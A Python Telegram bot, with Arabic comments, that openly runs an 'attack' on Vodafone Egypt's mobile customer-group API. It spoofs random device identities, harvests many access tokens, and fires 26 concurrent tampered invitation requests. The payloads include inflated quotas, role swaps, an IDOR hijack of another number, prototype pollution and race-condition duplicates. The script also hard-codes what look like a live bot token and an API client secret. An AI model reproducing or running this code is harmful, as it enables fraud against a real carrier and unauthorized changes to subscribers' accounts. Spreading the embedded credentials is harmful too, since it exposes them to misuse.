#!/usr/bin/env python3
import asyncio
import aiohttp
import json
import time
import random
import os
import logging
import copy
import string

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

try:
    import uvloop
    uvloop.install()
except Exception:
    pass

logging.basicConfig(level=logging.INFO)

# توكن البوت الخاص بك
TOKEN = "8853934310:AAHQ0FEd7oECal5f3sdd61MeD_gvRyBhsZ4"

bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# إعدادات فودافون
AUTH_URL = "https://mobile.vodafone.com.eg/auth/realms/vf-realm/protocol/openid-connect/token"
GROUP_URL = "https://mobile.vodafone.com.eg/services/dxl/cg/customerGroupAPI/customerGroup"
CLIENT_ID = "AnaVF"
CLIENT_SECRET = "dca0pbLUWXVhXR266Gw1iT5rqwvvJQoN"
DIGITAL_ID = "2AXVRLXYD8QVF"

def to_intl(num):
    num = str(num).strip()
    if num.startswith("0"): return "20" + num[1:]
    return num

def generate_random_device():
    os_versions = ["10", "11", "12", "13", "14"]
    devices = [
        "Xiaomi Redmi Note 8", "Samsung SM-A125F", "Huawei P30 Lite",
        "Oppo A15", "Realme C25", "Infinix X657", "Tecno Spark 8",
        "Vivo Y21", "Samsung SM-G991B", "Xiaomi POCO X3"
    ]
    return {
        "user_agent": f"okhttp/4.{random.randint(8, 12)}.0",
        "device_id": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
        "agent_device": random.choice(devices),
        "agent_version": f"2026.{random.randint(1, 5)}.{random.randint(1, 9)}",
        "agent_build": str(random.randint(1000, 1150)),
        "agent_os": random.choice(os_versions)
    }

def build_auth_headers(phone, dev):
    return {
        "Accept": "application/json", "Connection": "keep-alive", "silentLogin": "true",
        "x-agent-operatingsystem": dev["agent_os"], "clientId": "AnaVodafoneAndroid",
        "Accept-Language": "ar", "x-agent-device": dev["agent_device"],
        "x-agent-version": dev["agent_version"], "x-agent-build": dev["agent_build"], 
        "digitalId": DIGITAL_ID, "device-id": dev["device_id"], 
        "Content-Type": "application/x-www-form-urlencoded",
        "Host": "mobile.vodafone.com.eg", "User-Agent": dev["user_agent"],
        "msisdn": phone
    }

async def fetch_single_token(session, username, password, dev):
    data = {"grant_type": "password", "username": username, "password": password,
            "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET}
    try:
        async with session.post(AUTH_URL, data=data, headers=build_auth_headers(username, dev),
                                 ssl=False, timeout=aiohttp.ClientTimeout(total=15)) as resp:
            if resp.status == 200:
                j = await resp.json()
                return j.get("access_token")
    except Exception:
        pass
    return None

def build_api_headers(token, msisdn, device, custom_headers=None):
    h = {
        "Authorization": "Bearer " + token, "api-version": "v2",
        "device-id": device["device_id"], "x-agent-operatingsystem": device["agent_os"],
        "clientId": "AnaVodafoneAndroid", "x-agent-device": device["agent_device"],
        "x-agent-version": device["agent_version"], "x-agent-build": device["agent_build"],
        "msisdn": msisdn, "Accept": "application/json", "Accept-Language": "ar",
        "Content-Type": "application/json; charset=UTF-8", "Host": "mobile.vodafone.com.eg",
        "Connection": "Keep-Alive", "User-Agent": device["user_agent"],
    }
    if custom_headers: h.update(custom_headers)
    return h

def get_red_base(owner, member, mi=5000, voice=5000):
    return {
        "category": [
            {"listHierarchyId": "PackageID", "value": "8804"},
            {"listHierarchyId": "TemplateID", "value": "880"},
            {"listHierarchyId": "TierID", "value": "8804"}
        ],
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "MI", "value": str(mi)},
                    {"characteristicName": "Voice", "value": str(voice)},
                    {"characteristicName": "extraMember", "value": "0"}
                ]
            },
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": str(owner)}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": str(member)}], "type": "Member"}
            ]
        },
        "type": "SendInvitation"
    }

def get_flex_base(owner, member, percentage=100):
    return {
        "category": [
            {"listHierarchyId": "PackageID", "value": "523"},
            {"listHierarchyId": "TemplateID", "value": "47"},
            {"listHierarchyId": "TierID", "value": "523"}
        ],
        "parts": {
            "characteristicsValue": {
                "characteristicsValue": [
                    {"characteristicName": "quotaDist1", "type": "percentage", "value": str(percentage)}
                ]
            },
            "member": [
                {"id": [{"schemeName": "MSISDN", "value": str(owner)}], "type": "Owner"},
                {"id": [{"schemeName": "MSISDN", "value": str(member)}], "type": "Member"}
            ]
        },
        "type": "SendInvitation"
    }

def build_26_test_payloads(owner, member, hijack_phone):
    owner, member, hijack = str(owner), str(member), str(hijack_phone)
    intl_member = to_intl(member)
    tests = []
    
    red = get_red_base(owner, member)
    flex = get_flex_base(owner, member)

    tests.append({"id": "A1_A2_A5", "name": "التطبيع (Normalization)", "payload": get_red_base(owner, intl_member), "form": False})
    tests.append({"id": "A6", "name": "تكرار العضو داخل الطلب", "payload": red, "form": False})
    tests[-1]["payload"]["parts"]["member"].append({"id": [{"schemeName": "MSISDN", "value": intl_member}], "type": "Member"})

    tests.append({"id": "B7", "name": "كوتا ضخمة 99999", "payload": get_red_base(owner, member, 99999, 99999), "form": False})
    b8 = copy.deepcopy(red); b8["parts"]["characteristicsValue"]["characteristicsValue"].append({"characteristicName": "SMS", "value": "500"})
    tests.append({"id": "B8", "name": "حقن SMS", "payload": b8, "form": False})
    b9 = copy.deepcopy(red); b9["parts"]["characteristicsValue"]["characteristicsValue"][2]["value"] = "1"
    tests.append({"id": "B9", "name": "extraMember=1", "payload": b9, "form": False})
    b10 = copy.deepcopy(red); del b10["parts"]["characteristicsValue"]["characteristicsValue"][2]
    tests.append({"id": "B10", "name": "مسح extraMember", "payload": b10, "form": False})

    tests.append({"id": "C11", "name": "Flex 100%", "payload": flex, "form": False})
    tests.append({"id": "C12", "name": "تزامن Flex 100%", "payload": flex, "form": False}) 
    c13 = copy.deepcopy(flex); c13["parts"]["characteristicsValue"]["characteristicsValue"].append({"characteristicName": "quotaDist2", "value": "50"})
    tests.append({"id": "C13", "name": "حقول نسب إضافية", "payload": c13, "form": False})
    c14 = copy.deepcopy(flex); c14["category"] = [{"listHierarchyId": "TemplateID", "value": "880"}]
    tests.append({"id": "C14", "name": "خلط TemplateID", "payload": c14, "form": False})

    tests.append({"id": "D15", "name": "Batch Array", "payload": [red, red], "form": False})
    tests.append({"id": "D16", "name": "Nested Batch", "payload": {"requests": [red, red]}, "form": False})
    d17 = copy.deepcopy(red)
    for _ in range(2): d17["parts"]["member"].append({"id": [{"schemeName": "MSISDN", "value": member}], "type": "Member"})
    tests.append({"id": "D17", "name": "تكرار 3 مرات", "payload": d17, "form": False})
    d18 = copy.deepcopy(red)
    d18["parts"]["member"][1]["id"] = [{"schemeName": "MSISDN", "value": member}, {"schemeName": "MSISDN", "value": intl_member}]
    tests.append({"id": "D18", "name": "هويتين لعضو", "payload": d18, "form": False})
    d19 = copy.deepcopy(red); d19["parts"]["member"][1]["id"][0]["value"] = f"{member},{intl_member}"
    tests.append({"id": "D19", "name": "فواصل نصية", "payload": d19, "form": False})
    d20 = copy.deepcopy(red); d20["parts"]["member"][1]["id"][0]["value"] = int(member)
    tests.append({"id": "D20", "name": "Integer Type", "payload": d20, "form": False})
    tests.append({"id": "D21", "name": "Form-Data", "payload": red, "form": True})
    d22 = copy.deepcopy(red)
    d22["parts"]["member"][0]["type"] = "Member"; d22["parts"]["member"][1]["type"] = "Owner"
    tests.append({"id": "D22", "name": "عكس الأدوار", "payload": d22, "form": False})

    e23 = copy.deepcopy(red); e23["__proto__"] = {"isAdmin": True, "type": "Owner"}
    tests.append({"id": "E23", "name": "Prototype Pollution", "payload": e23, "form": False})
    e24 = copy.deepcopy(red)
    e24["parts"]["member"] = [
        {"id": [{"schemeName": "MSISDN", "value": member}], "type": "Owner"},
        {"id": [{"schemeName": "MSISDN", "value": owner}], "type": "Member"}
    ]
    tests.append({"id": "E24", "name": "Index Trust (Swap)", "payload": e24, "form": False})
    e25 = get_red_base(hijack, member)
    tests.append({"id": "E25", "name": "IDOR Hijack", "payload": e25, "form": False})
    e26 = copy.deepcopy(red); e26["parts"]["characteristicsValue"]["characteristicsValue"][2]["value"] = None
    tests.append({"id": "E26", "name": "Null Value", "payload": e26, "form": False})

    while len(tests) < 26:
        tests.append({"id": f"X{len(tests)+1}", "name": "تزامن عادي إضافي", "payload": red, "form": False})

    return tests

async def fire_test_request(session, token, owner_phone, test_data, device):
    headers = build_api_headers(token, owner_phone, device)
    payload = test_data["payload"]
    if test_data.get("form"):
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        data_to_send = f"data={json.dumps(payload)}"
    else:
        data_to_send = json.dumps(payload)
    try:
        async with session.post(GROUP_URL, data=data_to_send, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=25)) as resp:
            return test_data["id"], test_data["name"], resp.status, await resp.text()
    except Exception as e:
        return test_data["id"], test_data["name"], 0, f"EXCEPTION: {str(e)[:100]}"

async def cancel_invite(session, token, owner_phone, member_phone):
    payload = {
        "category": [{"listHierarchyId": "TemplateID", "value": "880"}],
        "createdBy": {"value": "MobileApp"}, "name": "EnterpriseRedFamily",
        "parts": {"member": [
            {"id": [{"schemeName": "MSISDN", "value": to_intl(member_phone)}], "type": "Member"},
            {"id": [{"schemeName": "MSISDN", "value": to_intl(owner_phone)}], "type": "Owner"}
        ]}, "type": "CancelInvitation",
    }
    device = generate_random_device()
    headers = build_api_headers(token, owner_phone, device)
    try:
        async with session.patch(GROUP_URL, data=json.dumps(payload), headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            return resp.status in (200, 201)
    except Exception:
        return False

# FSM States
class AttackState(StatesGroup):
    waiting_for_data = State()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "🚀 **مرحباً بك في بوت مختبر فودافون الذكي!**\n\n"
        "للبدء في تنفيذ الهجوم/الاختبارات، استخدم الأمر التالي:\n"
        "`/attack`\n\n"
        "بالصيغة الآتية:\n"
        "`رقم_الأونر | الباسورد | رقم_العضو`\n"
        "مثال:\n"
        "`01012345678 | mypassword | 01098765432`"
    )

@dp.message(Command("attack"))
async def cmd_attack(message: types.Message, state: FSMContext):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await message.answer("⚠️ يرجى إدخال البيانات بالشكل الصحيح بعد الأمر.\nمثال:\n`/attack 01012345678 | pass | 01098765432`")
        return
    
    parts = [p.strip() for p in args[1].split("|")]
    if len(parts) < 3:
        await message.answer("⚠️ البيانات ناقصة. تأكد من إدخال: `رقم الأونر | الباسورد | رقم العضو`")
        return
    
    owner, owner_pw, member = parts[0], parts[1], parts[2]
    hijack = "01000000000"
    
    status_msg = await message.answer("🔐 جاري سحب التوكنات وتجهيز 26 اختباراً متزامناً...")
    
    tests = build_26_test_payloads(owner, member, hijack)
    total_tests = len(tests)

    connector = aiohttp.TCPConnector(ssl=False, limit=100, force_close=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tokens = []
        devices = []
        attempts = 0
        
        while len(tokens) < total_tests and attempts < 80:
            attempts += 1
            dev = generate_random_device()
            tok = await fetch_single_token(session, owner, owner_pw, dev)
            if tok:
                tokens.append(tok)
                devices.append(dev)
            await asyncio.sleep(0.05)
            
        if len(tokens) < total_tests:
            await bot.edit_message_text(f"❌ فشل سحب العدد الكافي من التوكنات. تم توفير {len(tokens)} فقط.", chat_id=message.chat.id, message_id=status_msg.message_id)
            return
        
        await bot.edit_message_text(f"🚀 تم سحب {total_tests} توكن بنجاح! جاري إطلاق الاختبارات...", chat_id=message.chat.id, message_id=status_msg.message_id)
        
        t0 = time.time()
        tasks = [fire_test_request(session, tokens[i], owner, tests[i], devices[i]) for i in range(total_tests)]
        results = await asyncio.gather(*tasks)
        elapsed = time.time() - t0
        
        success_count = sum(1 for _, _, status, _ in results if status in (200, 201))
        
        summary = f"✅ **انتهاء الهجوم في {elapsed:.3f} ثانية!**\n📊 الناجحة (200/201): {success_count}/{total_tests}\n\n"
        for tid, tname, status, text in results[:10]: # عرض عينة أولية لتجنب تجاوز حد الرسائل
            summary += f"• `[{tid}]` {tname} -> HTTP `{status}`\n"
            
        await message.answer(summary)
        
        # تنظيف
        await cancel_invite(session, tokens[0], owner, member)

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
